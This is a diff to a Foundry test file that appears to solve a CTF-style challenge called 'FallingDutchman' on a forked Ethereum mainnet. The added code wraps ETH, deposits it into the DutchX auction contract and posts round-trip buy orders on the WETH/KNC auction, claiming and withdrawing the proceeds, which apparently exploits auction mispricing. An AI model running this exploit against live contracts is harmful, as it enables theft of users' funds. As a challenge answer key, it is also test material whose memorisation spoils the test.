@@ -8,6 +8,7 @@ import "./Constants.sol";
 
 contract FallingDutchman is Test {
     address user = vm.envAddress("USER_ADDRESS");
+    IDutchX dx = IDutchX(DUTCHX);
 
     function setUp() public {
         vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
@@ -16,7 +17,32 @@ contract FallingDutchman is Test {
 
     function test_Solution() public {
         vm.startBroadcast(user);
-        // Your solution goes here.
+        // setup
+        IWETH(WETH).deposit{value: 0.1 ether}(); // wrap all
+        IERC20(WETH).approve(DUTCHX, 0.1 ether);
+        dx.deposit(WETH, 0.1 ether);
+
+        // loop
+        uint idx = dx.getAuctionIndex(WETH, KNC);
+        console.log(idx);
+
+        // buy up all KNC and claim
+        dx.postBuyOrder(KNC, WETH, idx, 0.1 ether);
+        dx.claimBuyerFunds(KNC, WETH, user, idx);
+
+        // buy up all WETH and claim
+        uint knc = dx.balances(KNC, user);
+        console.log(knc / 1e18);
+        dx.postBuyOrder(WETH, KNC, idx, knc);
+        dx.claimBuyerFunds(WETH, KNC, user, idx);
+
+        // withdraw
+        uint weth = dx.balances(WETH, user);
+        console.log(weth / 1e18, weth % 1e18);
+        dx.withdraw(WETH, dx.balances(WETH, user));
+        //unwrap
+        IWETH(WETH).withdraw(IERC20(WETH).balanceOf(user));
+
         vm.stopBroadcast();
         checkSolve();
     }
